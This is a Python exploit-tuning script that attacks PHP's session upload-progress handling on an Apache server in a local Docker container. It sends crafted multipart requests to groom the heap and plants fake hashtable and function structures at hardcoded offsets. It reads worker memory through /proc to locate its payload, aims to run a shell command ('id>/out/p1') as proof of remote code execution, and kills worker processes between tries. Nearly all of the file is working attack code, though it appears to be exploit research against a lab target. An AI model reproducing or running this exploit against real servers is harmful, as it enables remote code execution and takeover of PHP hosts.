import os
import subprocess, sys, time, os, struct, importlib.util

BASE = os.path.dirname(os.path.abspath(__file__))
c = "p2s8335"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

spec = importlib.util.spec_from_file_location("exploit", os.path.join(BASE, "exploit.py"))
exploit_mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(exploit_mod)
Target = exploit_mod.Target
build_multipart = exploit_mod.build_multipart
SID = exploit_mod.SID
MAX_CMD = exploit_mod.MAX_CMD

def get_worker():
    r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    worker_pid = pids[-1]
    r = sh(f'docker exec {c} sh -c "grep libphp /proc/{worker_pid}/maps 2>/dev/null | head -1"')
    B = int(r.stdout.strip().split("-")[0], 16)
    return worker_pid, B

pid = None
B = None
ps_hsv = None

def read_mem(addr, size):
    r = subprocess.run(
        f'docker exec {c} sh -c "dd if=/proc/{pid}/mem bs=1 skip={addr} count={size} 2>/dev/null"',
        shell=True, capture_output=True
    )
    return r.stdout

def build_fake_payload(htdata, zif, cmd=b"id>/out/p1"):
    if len(cmd) > MAX_CMD:
        cmd = cmd[:MAX_CMD]
    ht = bytearray(b"\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)
    struct.pack_into("<Q", ht, E + 0x08, 0)
    struct.pack_into("<Q", ht, E + 0x10, zif)
    struct.pack_into("<Q", ht, E + 0x18, 0)
    struct.pack_into("<Q", ht, E + 0x20, 0)
    struct.pack_into("<I", ht, E + 0x28, 0)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x30, 0)
    struct.pack_into("<Q", ht, E + 0x38, 0)
    struct.pack_into("<I", ht, E + 0x40, 0)
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, E + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)

zif = 0x3ac080
dtor = 0x49ec50
htdata = 0x690d8
ht = build_fake_payload(htdata, zif)
carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]

target = Target("http://127.0.0.1:18112/index.php", timeout=120, verbose=False)

# Try different pad configurations
pad_configs = [
    ("[(31,31)]*4", [(31, 31)] * 4),
    ("[(31,31)]*5", [(31, 31)] * 5),
    ("[(31,31)]*6", [(31, 31)] * 6),
    ("[(31,31)]*7", [(31, 31)] * 7),
    ("[(31,31)]*8", [(31, 31)] * 8),
    ("[(31,31)]*10", [(31, 31)] * 10),
    ("[(23,23)]*6", [(23, 23)] * 6),
    ("[(15,15)]*6", [(15, 15)] * 6),
    ("[(39,39)]*6", [(39, 39)] * 6),
    ("[(47,47)]*6", [(47, 47)] * 6),
]

results = []

for pad_name, pads in pad_configs:
    pid, B = get_worker()
    ps_base = B + 0x10432a0
    ps_hsv = ps_base + 0x150

    # Build request A
    parts_a = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for i, (nl, vl) in enumerate(pads):
        name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
        parts_a.append({"name": name, "data": b"V" * vl})
    parts_a.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
    parts_a.append({"name": "big", "data": b"B" * (12 * 1024 * 1024)})

    body_a = build_multipart(parts_a, b"S" * 17)
    try:
        target.post(body_a, b"S" * 17, read_cap=1 << 20, timeout=120,
                     extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
    except Exception as e:
        print(f"[!] Request A failed for {pad_name}: {e}", flush=True)
        continue
    time.sleep(0.3)

    # Read R after request A
    data = read_mem(ps_hsv, 16)
    R = 0
    if len(data) >= 16:
        R = struct.unpack("<Q", data[:8])[0]
        if R == 0:
            print(f"[{pad_name}] R=0 (UNDEF) after request A", flush=True)
            continue

    # Build request B
    parts_b = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(2):
        parts_b.append({"name": f"f{i:02d}", "data": b"F" * 15})
    parts_b.append({"name": "g00", "data": carrier})
    for i in range(15):
        parts_b.append({"name": f"a{i:030d}"[:31], "data": ht})

    body_b = build_multipart(parts_b, b"B" * 10)
    try:
        target.post(body_b, b"B" * 10, read_cap=65536, timeout=30)
    except Exception as e:
        print(f"[!] Request B failed for {pad_name}: {e}", flush=True)
        continue
    time.sleep(0.3)

    # Re-read R after request B (might have moved)
    data_b = read_mem(ps_hsv, 16)
    R_b = 0
    if len(data_b) >= 16:
        R_b = struct.unpack("<Q", data_b[:8])[0]

    # Search for carrier in heap around R (old) and R_b (new)
    found = []
    for R_addr in [R, R_b]:
        if R_addr == 0:
            continue
        search_start = R_addr - 0x100000
        search_end = R_addr + 0x100000
        for off in range(0, search_end - search_start, 0x10000):
            chunk_start = search_start + off
            chunk = read_mem(chunk_start, 0x10000)
            if len(chunk) < 16:
                continue
            idx = chunk.find(carrier)
            while idx != -1:
                found.append((chunk_start + idx, R_addr))
                idx = chunk.find(carrier, idx + 1)

    # Find the closest carrier to R
    best = None
    for addr, R_ref in found:
        rel = addr - R_ref
        if best is None or abs(rel) < abs(best[1]):
            best = (addr, rel, R_ref)

    if best:
        print(f"[{pad_name}] R={R:#x} R_b={R_b:#x} carrier@{best[0]:#x} (R+{best[1]:+x})", flush=True)
    else:
        print(f"[{pad_name}] R={R:#x} R_b={R_b:#x} carrier NOT FOUND", flush=True)

    results.append((pad_name, R, R_b, best))

    # Check for RCE proof
    r = sh(f'docker exec {c} sh -c "cat /out/p1 2>/dev/null || cat /www/p1 2>/dev/null || cat /tmp/p1 2>/dev/null"')
    if r.stdout.strip():
        print(f"  *** RCE PROOF: {r.stdout.strip()} ***", flush=True)
        break

    # Rotate worker between attempts
    sh(f'docker exec {c} sh -c "kill -9 $(ps -eo pid,comm | grep apache2 | grep -v grep | awk \'NR==2\' {{print $1}}) 2>/dev/null"')
    time.sleep(1)
    # Wait for worker to respawn
    for _ in range(10):
        r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
        if len(r.stdout.strip().splitlines()) >= 2:
            break
        time.sleep(0.5)

print(f"\n=== SUMMARY ===", flush=True)
for pad_name, R, R_b, best in results:
    if best:
        print(f"  {pad_name}: carrier at R+{best[1]:+x}", flush=True)
    else:
        print(f"  {pad_name}: carrier NOT FOUND", flush=True)
